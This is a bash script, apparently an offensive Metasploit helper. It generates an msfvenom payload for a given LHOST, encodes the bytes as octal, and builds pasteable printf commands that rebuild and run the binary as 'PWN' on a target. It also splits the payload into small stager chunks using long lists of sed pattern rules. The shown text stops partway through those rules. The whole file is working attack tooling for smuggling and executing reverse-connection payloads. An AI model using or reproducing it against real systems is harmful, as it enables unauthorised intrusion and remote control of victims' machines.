#!/bin/bash

# inputcheck-interrupt -----------
if [ -n "$2" ]; then #2a
[ "$2" = "spec" ] || [ "$2" = "special" ] || [ "$2" = "fast" ] || [ "$2" = "yes" ] || [ "$2" = "y" ] || [ "$2" = "Y" ] || [ "$2" = "-y" ] || [ -n "$(echo "$2" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] || echo -e '\ninvalid stager method!'
[ "$2" = "spec" ] || [ "$2" = "special" ] || [ "$2" = "fast" ] || [ "$2" = "yes" ] || [ "$2" = "y" ] || [ "$2" = "Y" ] || [ "$2" = "-y" ] || [ -n "$(echo "$2" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] || inputerr='HELP'
fi
if [ -n "$3" ]; then #3a
[ "$3" = "yes" ] || [ "$3" = "y" ] || [ "$3" = "Y" ] || [ "$3" = "-y" ] || [ -n "$(echo "$3" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] || echo -e '\ninvalid input (start msf use: yes)'
[ "$3" = "yes" ] || [ "$3" = "y" ] || [ "$3" = "Y" ] || [ "$3" = "-y" ] || [ -n "$(echo "$3" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] || inputerr='HELP'
fi
if [ -n "$4" ]; then #4a
[ -n "$(echo "$4" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] || echo -e '\ninvalid input (msf <LHOST>)'
[ -n "$(echo "$4" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] || inputerr='HELP'
fi
[ -n "$(echo "$1" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] || [ -f "$1" ] || inputerr='HELP'
if [ "$inputerr" = "HELP" ]; then
[ -n "$(echo "$1" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ] || [ "$1" = "h" ] || [ "$1" = "-h" ] || [ "$1" = "--h" ] || [ "$1" = "help" ] || [ "$1" = "-help" ] || [ "$1" = "--help" ] || [ -z "$1" ] || [ -f "$1" ] || echo -e '\npayload: no such file! (exit)'
echo -e '\nuse -> ./script <LHOST> or <PAYLOAD> and optional {<STAGER> spec|fast} and/or {<START_MSF> yes and/or <SET_LHOST_MSF>}\n'
echo -e 'example -> ./scpt 192.168.1.241 yes (start metasploit, set custom later) optional is "yes" if IP is specified!'
echo -e 'example -> ./scpt 192.168.1.241 0.0.0.0 (start metasploit, set all listeners)'
echo -e 'example -> ./scpt 192.168.1.241 fast yes 0.0.0.0 (create payload with fast method and start metasploit, set all listeners)'
echo -e 'example -> ./scpt payload_shell fast yes 0.0.0.0 (same as above, pre-made payload instead of IP)'
echo -e '(default stager method: special, work time: 2.5-5s)\n'
exit
fi
# payload convert ----------- !!! CUSTOMIZE YOU PAYLOAD & MSFVENOM CREATE COMMAND !!!
vLHOST="$1"
vLPORT='4444'
vPAYLOAD='<ADD_PAYLOAD>' # metasploit also starts with this!
vMSFV_OPTIONS='<ADD_OPTIONS>' # for msfvenom cutom optional options
if [ -n "$(echo "$1" | sed '/^[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}$/!d')" ]; then
echo -e '\nchosen: create payload (can be changed in script)\n'
# msfvenom -p $vPAYLOAD "$vMSFV_OPTIONS" LHOST=$vLHOST LPORT=$vLPORT | od -A n -t o1 | tr -d '\n' | sed 's/ /\n/g' | sed '/^[[:space:]]*$/d;s/000/0/g;s/^00//g;/^0[1-9]/s/^/\*/g;s/\*0//g' | paste -d ':' -s | sed 's/.*/:&/' > octal_colon.txt
msfvenom -p $vPAYLOAD "$vMSFV_OPTIONS" LHOST=$vLHOST LPORT=$vLPORT > payload_shell
cat payload_shell | od -A n -t o1 | tr -d '\n' | sed 's/ /\n/g' | sed '/^[[:space:]]*$/d;s/000/0/g;s/^00//g;/^0[1-9]/s/^/\*/g;s/\*0//g' | paste -d ':' -s | sed 's/.*/:&/' > octal_colon.txt
else
echo -e '\nchosen: payload file usage'
od -A n -t o1 "$1" | tr -d '\n' | sed 's/ /\n/g' | sed '/^[[:space:]]*$/d;s/000/0/g;s/^00//g;/^0[1-9]/s/^/\*/g;s/\*0//g' | paste -d ':' -s | sed 's/.*/:&/' > octal_colon.txt
fi
# simple usefull outputs *************************
# sed  "s/:/\n&/$(expr `sed 's/[0-9]//g' octal_colon.txt | wc -L` / 2)" octal_colon.txt | sed 's/.*/printf "&">>PWN/g;1s/>>/>/;s/:/\\\\/g' > rawprintf.sh; sed '$a chmod +x PWN\n./PWN' -i rawprintf.sh  # This is only 2 equal part! (works with large files)
echo -e '\nCreate improvised pasteable files:\nuse -> rawprintf.sh (default: 2 row, can be changed in script)'
sed "s/\(.\{$(expr `cat octal_colon.txt | wc -L` / 2)\}\):/\1\n:/g" octal_colon.txt | sed 's/.*/printf "&">>PWN/g;1s/>>/>/;s/:/\\\\/g' > rawprintf.sh; sed '$a chmod +x PWN\n./PWN' -i rawprintf.sh
# STAGER METHOD WORKPROCESS -----------
if [ "$2" = "fast" ]; then # (chosen: "fast" method) -----
# Alternative split stager method [with nearly 80-90% hits!] def.: 6 -> 22
echo -e '\nStager created: fast method (approx: 80-90% compared to the special one).'
sed "s/\(.\{6\}\):/\1\n:/g" octal_colon.txt > oc_part.txt # ; sed 's/.*/printf "&">>M/g;1s/>>/>/;s/:/\\/g' oc_part.txt > printf_stager_fast.sh
else # (default, chosen: "special" method) -----
echo -e '\nStager created: special method (approx: 100% length reduction)! :-)'
# Row splitting with 100% hits, only time-consuming (2.5-5 sec)
cp octal_colon.txt /tmp/octal_colon.txt

sed 's/$/:/g' -i octal_colon.txt

[ -f oc_part.txt ] && rm oc_part.txt

echo -e '\nWAIT...._P'
while true
do
# breaks out and always start top.
while true
do
# max_stgr_24 -> set_22_to_20
set_22_to_20 () {
# (22)
# --------------- A1
[ -n "$(sed '/^:[1-9][0-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9]:[1-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9]:[1-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9]:[1-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[0-9]:[0-9]:[0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[0-9]:[0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[0-9]:[0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
# --------------- B1
[ -n "$(sed '/^:[1-9][0-9][0-9]:[1-9][0-9][0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9][0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9][0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[0-9]:[1-9][0-9][0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[1-9][0-9][0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[1-9][0-9][0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9][0-9]:[0-9]:[0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[0-9]:[0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[0-9]:[0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9][0-9]:[1-9][0-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9][0-9]:[1-9][0-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9][0-9]:[1-9][0-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9][0-9]:[0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9][0-9]:[0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9][0-9]:[0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9][0-9]:[0-9]:[1-9][0-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[0-9]:[1-9][0-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[0-9]:[1-9][0-9][0-9]:[0-9]//1' -i octal_colon.txt && break
# --------------- C1
[ -n "$(sed '/^:[1-9][0-9][0-9]:[0-9]:[0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[0-9]:[0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[0-9]:[0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[0-9]:[0-9]:[0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[0-9]:[0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[0-9]:[0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[0-9]:[1-9][0-9][0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[1-9][0-9][0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[1-9][0-9][0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[0-9]:[0-9]:[1-9][0-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[0-9]:[1-9][0-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[0-9]:[1-9][0-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9][0-9]:[0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9][0-9]:[0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9][0-9]:[0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
# --------------- D1
[ -n "$(sed '/^:[0-9]:[1-9][0-9]:[1-9][0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9]:[1-9][0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9]:[1-9][0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9][0-9]:[1-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9][0-9]:[1-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9][0-9]:[1-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[0-9]:[1-9][0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[0-9]:[1-9][0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[0-9]:[1-9][0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[0-9]:[1-9][0-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[0-9]:[1-9][0-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[0-9]:[1-9][0-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9]:[0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9]:[0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9]:[0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9]:[1-9][0-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9]:[1-9][0-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9]:[1-9][0-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9][0-9]:[0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9][0-9]:[0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9][0-9]:[0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9][0-9]:[0-9]:[1-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[0-9]:[1-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[0-9]:[1-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9][0-9]:[1-9][0-9]:[0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9]:[0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9]:[0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9][0-9]:[1-9][0-9]:[1-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9]:[1-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9]:[1-9][0-9]:[0-9]//1' -i octal_colon.txt && break
# --------------- E1
[ -n "$(sed '/^:[0-9]:[0-9]:[0-9]:[1-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[0-9]:[1-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[0-9]:[1-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[0-9]:[1-9][0-9]:[0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[1-9][0-9]:[0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[1-9][0-9]:[0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[0-9]:[1-9][0-9]:[1-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[1-9][0-9]:[1-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[1-9][0-9]:[1-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9]:[0-9]:[0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9]:[0-9]:[0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9]:[0-9]:[0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9]:[0-9]:[1-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9]:[0-9]:[1-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9]:[0-9]:[1-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9]:[1-9][0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9]:[1-9][0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9]:[1-9][0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[0-9]:[0-9]:[0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[0-9]:[0-9]:[0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[0-9]:[0-9]:[0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[0-9]:[0-9]:[1-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[0-9]:[0-9]:[1-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[0-9]:[0-9]:[1-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[0-9]:[1-9][0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[0-9]:[1-9][0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[0-9]:[1-9][0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9]:[0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9]:[0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9]:[0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
# (21)
# --------------- A2
[ -n "$(sed '/^:[1-9][0-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9][0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9][0-9]:[1-9][0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
# --------------- B2
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9]:[1-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9]:[1-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9]:[1-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9]:[0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9]:[0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9]:[0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[0-9]:[1-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[0-9]:[1-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[0-9]:[1-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9]:[1-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9]:[1-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9]:[1-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
# --------------- C2
[ -n "$(sed '/^:[0-9]:[0-9]:[1-9][0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[1-9][0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[1-9][0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9]:[0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9]:[0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9]:[0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[0-9]:[0-9]:[1-9][0-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[0-9]:[0-9]:[1-9][0-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[0-9]:[0-9]:[1-9][0-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[0-9]:[1-9][0-9][0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[1-9][0-9][0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[1-9][0-9][0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[1-9][0-9][0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[1-9][0-9][0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[1-9][0-9][0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9]:[1-9][0-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9]:[1-9][0-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9]:[1-9][0-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9][0-9]:[0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9][0-9]:[0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9][0-9]:[0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[1-9][0-9][0-9]:[1-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[1-9][0-9][0-9]:[1-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[1-9][0-9][0-9]:[1-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9]:[0-9]:[1-9][0-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9]:[0-9]:[1-9][0-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9]:[0-9]:[1-9][0-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9][0-9]:[0-9]:[0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[0-9]:[0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[0-9]:[0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9][0-9]:[0-9]:[1-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[0-9]:[1-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[0-9]:[1-9][0-9]:[0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[1-9][0-9][0-9]:[1-9][0-9]:[0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9]:[0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[1-9][0-9][0-9]:[1-9][0-9]:[0-9]:[0-9]//1' -i octal_colon.txt && break
# --------------- D2
[ -n "$(sed '/^:[0-9]:[0-9]:[0-9]:[0-9]:[1-9][0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[0-9]:[0-9]:[1-9][0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[0-9]:[0-9]:[1-9][0-9]//1' -i octal_colon.txt && break
[ -n "$(sed '/^:[0-9]:[0-9]:[0-9]:[1-9][0-9]:[0-9]:/!d' octal_colon.txt)" ] && sed 's/^:[0-9]:[0-9]:[0-9]:[1-9][0-9]:[0-9]/&\n/1' octal_colon.txt | sed '1!d' >> oc_part.txt && sed 's/^:[0-9]:[0-9]:[0-9]:[1-9][0-9]:[0-9]//1' -i octal_colon.txt && break
